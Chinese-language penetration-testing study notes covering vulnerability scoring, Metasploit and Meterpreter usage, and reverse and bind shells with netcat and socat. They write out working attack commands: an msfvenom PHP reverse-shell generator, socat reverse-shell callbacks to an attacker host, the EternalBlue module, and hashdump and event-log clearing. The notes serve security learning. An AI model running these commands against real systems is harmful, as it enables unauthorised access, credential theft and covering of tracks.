## Vulnerability Research
### 漏洞101
- 漏洞介绍
  - 系统或应用程序的设计、实施或行为中的弱点或缺陷
  - 主要类型
    1. 操作系统。存在于操作系统中，通常导致提权。
    2. 基于配置。
    3. 弱口令或默认。
    4. 应用逻辑。
    5. 人为因素。
  - 通常对操作系统和应用逻辑进行关注
- 漏洞评分
  - 通用漏洞评分系统( CVSS )
    - 2005年首次推出
    - 评分主要依据
      1. 漏洞利用的难度
      2. 是否存在对此漏洞的利用
      3. 漏洞对 CIA 三要素的影响 
  - 漏洞优先级评级 ( VPR )
    - 基于风险驱动的
- 漏洞数据库
  - [NVD](https://nvd.nist.gov/vuln/full-listing)
  - [Exploit-DB](http://exploit-db.com/)
  - 常见概念
    - Vulnerability(漏洞)
      - 漏洞被定义为系统或应用程序的设计、实现或行为中的弱点或缺陷
    - Exploit
      - 漏洞利用是诸如利用系统或应用程序漏洞的操作或行为
    - Proof of Concept (PoC)	
      - 概念验证是一种经常演示漏洞利用的技术或工具
      - 概念验证经常被用来作为0day、exploit的别名。（通常指并没有充分利用这个漏洞的exploit）
### 漏洞利用
- 自动/手动扫描
  - 漏洞扫描器 Nessus
  - 手动扫描漏洞通常是渗透测试人员在测试单个应用程序或程序时选择的武器。事实上，手动扫描将涉及搜索相同的漏洞并使用与自动扫描类似的技术
  - 殊途同归的是，这两项技术都是测试应用或程序的漏洞
    - Security Misconfigurations(安全配置错误)
    - Broken Access Control	(错误的访问控制)
    - Insecure Deserialization(不安全的反序列化)
    - Injection(注入)
  - [OWASP 框架]()
- 查询手动利用漏洞
  - [Rapid7](https://www.rapid7.com/db/)
  - github
  - Searchsploit
    - Exploit-DB 的离线版本
- 实例
  1. 网站首页，发现版本`Online Book Store 1.0`
  2. Exploit-DB 搜索，发现 RCE 漏洞，下载漏洞利用脚本
  3. 运行脚本
## Metasploit
### Metasploit简介
- 介绍
  - Metasploit有两个版本
    1. Metasploit Pro 商业版
    2. Metasploit Framework
  - Metasploit Framework主要组成
    1. msfconsole 命令行入口
    2. Modules 模块，如 exploits,scanners,payloads
    3. Tools 有助于漏洞研究、漏洞评估或渗透测试的独立工具, 如 msfvenom,pattern_create,pattern_offset
- 主要组件
  - 使用Metasploit Framework时 ,主要与 Metasploit 控制台进行交互.使用 `msfconsole`进入
  - 组件
    1. Auxiliary(辅助): 任何支持辅助模块，如扫描器、爬虫和模糊器
   
        ![Auxiliary](image/Auxiliary.png)
    2. Encoders(编码器): 允许对漏洞和有效载荷进行编码，以应对基于签名的防病毒策略
       
        ![Encoders](image/Encoders.png)
    3. Evasion(规避): 虽然编码器会对有效负载进行编码，但不应将其视为逃避防病毒软件的直接尝试。因为该模块会尝试规避防病毒策略

        ![Evasion](image/Evasion.png)
    4. Exploits: 漏洞利用，根据目标系统类型进行统一的分类
   
        ![Exploits](image/Exploits.png)   
    5. NOP：NOP（No OPeration）什么都不做。在 Intel x86 CPU 系列中以 0x90 表示，之后 CPU 将在一个周期内不执行任何操作。通常用作缓冲区以实现一致的有效负载大小

        ![NOP](image/NOPs.png)  
    6. Payloads: 有效载荷是将在目标系统上运行的代码

        ![Payloads](image/Payloads.png)
        - 在目标系统上运行命令渗透测试的一个重要的步骤，一个允许您键入可以在目标系统上执行命令的交互式连接可以实现该步骤。这样的交互式命令行称为`shell`。
        - Metasploit 提供了发送不同有效载荷的能力，这些有效载荷可以在目标系统上打开 `shell`
        - 三个不同的目录
          - Singles: 独立的Payload,无需下载额外的组件即可运行,例如 添加用户，运行 notepad.exe 等
          - Stagers: 负责建立 Metasploit 和目标系统的连接通道,是分阶段的,初始 Payload 大小相对较小
          - Stages
        - Singles 和 Stagers的辨认
          - `generic/shell_reverse_tcp`
          - `windows/x64/shell/reverse_tcp`
          - shell`_`reverse_tcp 属于 Singles
          - shell`/`reverse_tcp 属于 Stagers
    7. Post： Post 模块将在上面列出的渗透测试过程的最后阶段，post-exploitation 中很有用

        ![Post](image/Post.png)  
- Msfconsole
  - 可像一般shell一样运行命令，如`ls` `clear` `ping` 等，不过不支持重定向 `>`
  - `history`
  - `use exploit/windows/smb/ms17_010_eternalblue`
    - `show options`
    - `show payloads`
    - `info`
  - `search`
    - `search ms17-010`
    - `search type:auxiliary telnet`
- Working with modules
  - `use exploit/windows/smb/ms17_010_eternalblue`
    - `show options`
    - `set rhosts 1.1.1.1` `set rhosts target.txt`
    - 常用参数
      - `RHOSTS`
      - `RPORT`
      - `PAYLOADS`
      - `LHOST`
      - `LPORT`
    - `unset all`
    - `setg rhosts 1.1.1.1` 全局变量
    - `unsetg rhosts 1.1.1.1`

### Metasploit: Exploitation
- 扫描
  - 端口扫描
    - `search portscan`
  - UDP 服务标识
    - `scanner/discovery/udp_sweep`
  - SMB 扫描
    - `smb_enumshares`
    - `smb_version`
  - 引申：SMB 协议工作原理
    1. 客户端发送 SMB negotiate protocol request请求数据报，并列出所支持的所有SMB协议版本

        ![SMB negotiate protocol request](image/SMB%20negotiate%20protocol%20request.jpg)
        - 0x0202 　　 SMB 2.002
        - 0x0210 　　 SMB 2.1
        - 0x0300 　　 SMB 3.0
        - 0x0302 　　 SMB 3.02
        - 0x02FF 　　 SMB2
    2. 服务器收到请求信息后响应请求，并列出希望使用的协议版本。如果没有可使用的协议版本则返回0XFFFFH并结束通信。

        ![SMB negotiate protocol response](image/negotiate%20protocol%20response.jpg)
        - 可以看到服务端希望使用的版本是SMB2.1 
        - 注意:win7默认开启smbv1(只要开启共享服务),但是由于windows的安全机制,版本协商就高不就低,除非客户端版本只有SMBv1或者服务端只有SMBv1
        - 这里就可以利用了:客户端可以恶意把版本设置为只能是SMBv1,这样服务端和客户端协商通过只能用SMBv1
    3. 协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送session setup request请求数据报实现的。客户端发送一对用户名和密码或一个简单密码到服务器。

        ![SMB session setup request](image/session%20setup%20request.jpg)
    4. 服务器通过发送一个Session setup response应答数据报来允许或拒绝本次连接

        ![SMB session setup response](image/session%20setup%20response.jpg)
    5. 当客户端和服务器完成了磋商和认证之后，它会发送一个Tree connect rerquest SMB数据报并列出它想访问网络资源的名称　　

        ![SMB Tree connect rerquest](image/Tree%20connect%20rerquest.jpg)
    6. 服务器会发送一个tree connect response应答数据报以表示此次连接是否被接受或拒绝　　 
     
        ![SMB Tree connect response](image/Tree%20connect%20response.jpg)    
    7. 连接到相应资源后，SMB客户端就能够进行操作

        ![SMB操作](image/smb%E6%93%8D%E4%BD%9C.jpg)     
- Metasploit 数据库
  - 实际的渗透测试参与可能会有多个目标，Metasploit 具有数据库功能，可简化项目管理并避免在设置参数值时可能出现的混淆
  - 使用 `Postgresql`数据库
    - `systemctl start postgresql`
  - `msfdb init`命令初始化 Metasploit 数据库
  - 在`msfconsole`中使用 `db_status` 确认数据库状态
  - 创建工作区以隔离不同的项目
    - `workspace`
    - `workspace -a ` 创建工作区
    - `workspace -d`  删除工作区
  - Metasploit 数据库启动后，`help` 显示基于数据库的相关命令
    - 例如使用`db_nmap`,所有的结果都将保存在数据库中
    - 扫描完成后，使用`hosts`和`services`可以得到目标系统的相关信息
    - `hosts -R`可以设置 RHOSTS 参数的值
    - `services -S netbios` 检索指定的服务类型
- 漏洞扫描
  - Metasploit 可以快速识别一些 "low hanging fruit" 的关键漏洞。这些漏洞可能会让攻击者在系统上站稳脚跟，在某些情况下，还可以获得高级权限，例如 root 或管理员
  - 漏洞扫描的结果取决于目标扫描的完成度
  - 使用`search`搜索相关服务，查找漏洞
    - `search vnc`
    - `use auxiliary/scanner/vnc/vnc_login`
    - `info`
- Exploitation
  1. `search` 查找合适的 exploit
  2. `show options`
  3. `show payloads`
  4. `set payload`
  5. `exploit`
  - 后台`CTRL+Z` 
  - 中止`CTRL+C`
  - `sessions`
- Msfvenom
  - 用于代替 Msfpayload 和 Msfencode,生成 payload
  - Msfvenom 可以访问 Metasploit 框架中可用的所有 payload
  - Msfvenom 可以以多种不同的格式（PHP、exe、dll、elf 等）和针对多种不同的目标系统（Apple、Windows、Android、Linux 等）创建 payload
  - 举例：生成反向shell
    `msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php`
  
### Metasploit: Meterpreter
- Meterpreter介绍
  - 通过 Meterpreter 与目标操作系统和文件进行交互，并使用 Meterpreter 的专用命令
  - Meterpreter 运行在内存，使用`getpid`获得进程id
  - 使用 `ps` 列出目标系统运行的进程
  - Meterpreter payloads 也分两种， `stagged` 和 `inline`
  - `msfvenom --list payloads | grep meterpreter`
- Meterpreter命令
  - `help` 列出所有命令
  - Core commands (核心命令)
    - `background`
    - `exit`
    - `migrate`
    - `guid` 获取会话 GUID（全局唯一标识符）
    - ...
  - File system commands
    - `cd`
    - `ls`
    - `pwd`
    - `edit`
    - `cat`
    - `rm`
    - `search`
    - `upload`
    - `download`
  - Networking commands
    - `arp`
    - `ifconfig`
    - `netstat`
    - `portfwd` 将本地端口转发到远程服务
    - `route` 查看和修改路由表
  - System commands
    - `clearev` 清除事件日志
    - `execute` 执行命令
    - `getpid` 显示当前进程标识符
    - `getuid` 显示 Meterpreter 正在运行的用户
    - `kill` 
    - `pkill`
    - `ps`
    - `reboot`
    - `shell`
- 后期利用
  - `help`
  - `getuid`
  - `ps`
  - `Migrate`
    - `migrate 716` 迁移到进程716
  - `hashdump` 列出 SAM 数据库的内容
  - `search`
    - `search -f flag2.txt`
  - `shell`
- 实践
  - `sysinfo`

## Privilege Escalation
### What the Shell?
- 工具
  - 我们将使用多种工具来接收反向 shell 和发送绑定 shell。
  - 一般而言，我们需要恶意 shell 代码，以及与生成的 shell 交互的方法。
  - Netcat
  - Socat 更牢固的Netcat
  - Metasploit中的 multi/handler 模块
  - Msfvenom 生成payloads工具
- Shell的类型
  - 反向shell(Reverse shell)
    - 目标连接回攻击者的主机
  - 绑定shell(Bind shell)
    - 指在目标上执行的代码用于启动直接在目标上附加到 shell 的侦听器。然后这将向互联网开放，这意味着您可以连接到代码打开的端口并以这种方式获得远程代码执行。这具有不需要在您自己的网络上进行任何配置的优点，但可能会被保护目标的防火墙阻止。
  - 交互式和非交互式( interactive or non-interactive )
    - 如果使用 Powershell、Bash、Zsh、sh 或任何其他标准 CLI 环境，这些属于交互式shell。这些shell允许您在执行程序后与程序进行交互。例如，采用 SSH 登录提示。
      ![Interactive_shell](image/Interactive_shell.png)
    - 在非交互式 shell 中，您只能使用不需要用户交互即可正常运行的程序。不幸的是，大多数简单的反向和绑定 shell 都是非交互式的，这会使进一步的利用变得更加棘手。在非交互式 shell 中运行 SSH 时,发现没有任何回应。  
      ![Non-Interactive_shell](image/Non-Interactive_shell.png)
- Netcat
  - Reverse Shells
    - `nc -lvnp <port-number>`
      - **-l** 监听器
      - **-v** 详细输出
      - **-n** 不解析主机名或使用DNS
      - **-p** 遵循端口规范
  - Bind Shells
    - `nc <target-ip> <chosen-port>`
      - `nc 10.10.10.10 8080`
- 稳定Netcat shell
  - 已经捕获或连接到一个 netcat shell。
  - 默认情况下，这些 shell 非常不稳定。按 Ctrl + C 会断开连接。
  - 它们是非交互式的，并且经常有奇怪的格式错误。
  - 这是因为 netcat shell实际上是在终端内运行的进程，而不是真正的终端本身。
  - 方法一:Python
    - 适用于Linux系统。
    - 分为三步
      - 使用 `python3 -c 'import pty;pty.spawn("/bin/bash")'`,注意python版本；此时我们的 shell 看起来会更漂亮一些，但我们仍然无法使用 tab 自动完成或箭头键，而 Ctrl + C 仍会终止 shell。
      - 使用 `export TERM=xterm`
      - 使用 Ctrl + Z 后台运行Shell，使用`stty raw -echo; fg`
        - `stty raw -echo` 关闭自身终端回显(使用`reset`恢复)
        - `fg` 将后台程序转入前台执行
  
      ![Python_Stabilisation_shell](image/Python_Stabilisation_shell.png)
  - 方法二：rlwrap
    - `rlwrap nc -lvnp <port>`
    - 在 windows 上可以使用。
  - 方法三：Socat
    - **`python3 -m http.server <port>`**
    - Reverse Shell
      - 本地监听
        - `socat TCP-L:<port> -`
      - 回连
        - `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
          - **pipes** 强制 powershell 使用Unix风格
        - `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
    - Bind Shell
      - 远程监听
        - `socat TCP-L:<port> EXEC:powershell.exe`
        - `socat TCP-L<port> EXEC:"bash -li"`
      - 本地连接
        - `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
    - Socat稳定Reverse Shell
      - 本地监听
        - ``socat TCP-L:<port> FILE:`tty`,raw,echo=0 ``
      - 远程回连
        - `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
          - **pty**，在目标上分配一个伪终端——稳定过程的一部分
          - **stderr**，确保任何错误消息都显示在 shell 中（通常是非交互式 shell 的问题）
          - **sigint**，将任何 Ctrl + C 命令传递到子进程中，允许我们在 shell 中终止命令
          - **setsid**，在新会话中创建进程
          - **sane**，稳定终端，试图“正常化”它。

      ![Socat_1](image/socat_1.jpg)
- Common Shell Payloads
  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
  - Linux命令中的重定向(>)和管道(|)
    - 文件描述符
      - Linux的宗旨是一切皆文件，对于进程、IO等等都是通过文件的形式存在，这些文件都通过文件描述符的形式来表示。
      - Linux启动时，最开始会创建init进程，其余的程序都是这个进程的子进程。而init进程默认打开3个文件描述符：
        - 标准输入：standard input(0)
        - 标准输出：standard output(1)
        - 标准错误：standard error(2)
    - 重定向
      - 输出重定向
        - `ls exists.txt no-exists.txt 1 > success.txt 2 > fail.txt`
        - 关闭标准错误信息
          - `ls exists.txt no-exists.txt 2 > /dev/null`
          - `ls exists.txt no-exists.txt 2 > &-`
        - 关闭所有输出
          - `ls exists.txt no-exists.txt 1 > /dev/null 2 > /dev/null`
          - `ls exists.txt no-exists.txt 1 > &- 2 > &-`
          - `ls exists.txt no-exists.txt 2 > &1 1 > /dev/null`
      - 输入重定向
        - `cat > output.txt  < input.txt`
          - 类似于复制
      - 管道
        - `cat test.txt | grep -n 'test'`






